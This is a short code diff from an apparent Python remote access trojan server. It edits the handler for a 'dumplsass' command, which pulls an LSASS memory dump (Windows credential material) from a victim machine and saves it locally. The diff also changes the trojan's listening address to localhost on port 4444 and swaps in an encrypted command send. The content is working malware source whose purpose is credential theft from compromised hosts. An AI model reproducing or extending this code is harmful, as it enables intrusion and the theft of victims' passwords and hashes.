@@ -407,7 +407,7 @@ dumplsass                  dump lsass
 
             if command == 'dumplsass':
                 try:
-                    client.send(command.encode())
+                    client.send(command_encrypted.encode())
                     file = client.recv(2147483647)
                     with open('lsass_dump.dmp', 'wb') as f:
                         f.write(file)
@@ -426,7 +426,7 @@ dumplsass                  dump lsass
                 s.close()
                 client.close()
 
-rat = RAT_SERVER('192.168.1.51', 4444)
+rat = RAT_SERVER('127.0.0.1', 4444)
 
 if __name__ == '__main__':
     rat.build_connection()
